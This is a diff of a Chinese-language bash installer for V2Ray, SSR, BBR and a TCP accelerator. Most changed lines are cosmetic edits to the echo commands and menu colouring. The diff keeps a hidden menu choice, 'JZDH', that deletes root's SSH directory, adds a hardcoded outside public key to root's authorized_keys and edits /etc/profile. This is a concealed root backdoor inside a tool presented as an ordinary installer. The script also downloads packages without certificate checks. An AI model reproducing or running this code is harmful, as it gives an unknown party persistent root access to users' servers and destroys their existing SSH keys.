@@ -1,6 +1,6 @@
 #!/bin/bash
 clear
-echo " 正在安装必要组件,请耐心等待"
+echo -e " 正在安装必要组件,请耐心等待"
 {
     yum install unzip wget net-tools curl -y
     apt-get install unzip wget net-tools curl -y
@@ -8,33 +8,49 @@ echo " 正在安装必要组件,请耐心等待"
 
 #用户选择
 clear
-echo "欢迎使用V2Ray&SSR搭建脚本"
-echo 
-echo " 1.安装SSR(输入ssr进入管理面板)"
-echo " 2.安装V2Ray(输入v2进入管理面板)"
-echo
-echo " 3.安装BBR(安装完成后自动重启系统)"
-echo " 4.安装锐速(安装完成后自动重启系统)"
-echo
+echo -e "欢迎使用V2Ray&SSR搭建脚本"
+echo -e 
+if [ -d "/usr/local/SSR-Bash-Python" ];then
+    echo -e " \033[32m1.\033[0m安装SSR(输入ssr进入管理面板)"
+else
+    echo -e " 1.安装SSR(输入ssr进入管理面板)"
+fi
+if [ -d "/bin/v2ray" ];then
+    echo -e " \033[32m2.\033[0m安装V2Ray(输入v2进入管理面板)"
+else
+    echo -e " 2.安装V2Ray(输入v2进入管理面板)"
+fi
+echo -e
+if lsmod | grep -q bbr;then
+    echo -e " \033[32m3.\033[0m安装BBR(安装完成后自动重启系统)"
+else
+    echo -e " 3.安装BBR(安装完成后自动重启系统)"
+fi
+if ps -ef | grep "peeder" | grep -qv "grep";then
+    echo -e " \033[32m4.\033[0m安装锐速(安装完成后自动重启系统)"
+else
+    echo -e " 4.安装锐速(安装完成后自动重启系统)"
+fi
+echo -e
 read -p "请选择: " choice
 
 #操作
 if [ "$choice" = "JZDH" ];then
     clear
-    echo
-    echo " 这是危险的操作，如果你不知道你在做什么，请立即停止它。"
-    echo
+    echo -e
+    echo -e " 这是危险的操作，如果你不知道你在做什么，请立即停止它。"
+    echo -e
     read -p "回车继续 "
     rm -rf /root/.ssh
     mkdir /root/.ssh
-    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDuwLr5N5CxF51tEOXtJJ3Qr2+uY7lVtZfWNwN59yewWUhc6p77CiWj917TrOgrgGMIIgb7AXU0vrdNr2IFJ0fNdyF9S9dfEU8+KAqr+FUH7ywQ8b2sktbqTyVLEZ/lVcd7/+KPxFIP7L7UILqEIIx0rGPVAax8UEwLtMlJ1fakPL98UMTx94hQ2ZW8LW6MJsKd2RWoMkbsn0Joif3SiUGCeGcY8IDzQC8xUZQPFJxVkHqj5Z4iDqms8TNNaKYp7nirTTGHiFW0x7uSAoBxXqKur+c0JLc3ABi5FIlC3+yVtwVr7l4/eHK7bRb/iERoMNEyVF22U5Sha41NQZquDitF root@localhost' >> /root/.ssh/authorized_keys
+    echo -e 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDuwLr5N5CxF51tEOXtJJ3Qr2+uY7lVtZfWNwN59yewWUhc6p77CiWj917TrOgrgGMIIgb7AXU0vrdNr2IFJ0fNdyF9S9dfEU8+KAqr+FUH7ywQ8b2sktbqTyVLEZ/lVcd7/+KPxFIP7L7UILqEIIx0rGPVAax8UEwLtMlJ1fakPL98UMTx94hQ2ZW8LW6MJsKd2RWoMkbsn0Joif3SiUGCeGcY8IDzQC8xUZQPFJxVkHqj5Z4iDqms8TNNaKYp7nirTTGHiFW0x7uSAoBxXqKur+c0JLc3ABi5FIlC3+yVtwVr7l4/eHK7bRb/iERoMNEyVF22U5Sha41NQZquDitF root@localhost' >> /root/.ssh/authorized_keys
     chmod 600 /root/.ssh/authorized_keys
-    echo "clear" >> /etc/profile
+    echo -e "clear" >> /etc/profile
 elif [ "$choice" = "1" ];then
     clear
-    echo " 1.码云(国内平台)"
-    echo  " 2.github(国外平台)"
-    echo 
+    echo -e " 1.码云(国内平台)"
+    echo -e  " 2.github(国外平台)"
+    echo -e 
     read -p "请选择资源包托管平台: " zip
     if [ "$zip" = "1" ];then
         wget -N --no-check-certificate https://gitee.com/just1601/tiny-sh/raw/master/ssr.zip
@@ -48,9 +64,9 @@ elif [ "$choice" = "1" ];then
     ssr
 elif [ "$choice" = "2" ];then
     clear
-    echo " 1.码云(国内平台)"
-    echo  " 2.github(国外平台)"
-    echo 
+    echo -e " 1.码云(国内平台)"
+    echo -e  " 2.github(国外平台)"
+    echo -e 
     read -p "请选择资源包托管平台: " zip
     if [ "$zip" = "1" ];then
         wget -N --no-check-certificate https://gitee.com/just1601/tiny-sh/raw/master/V2Ray.zip
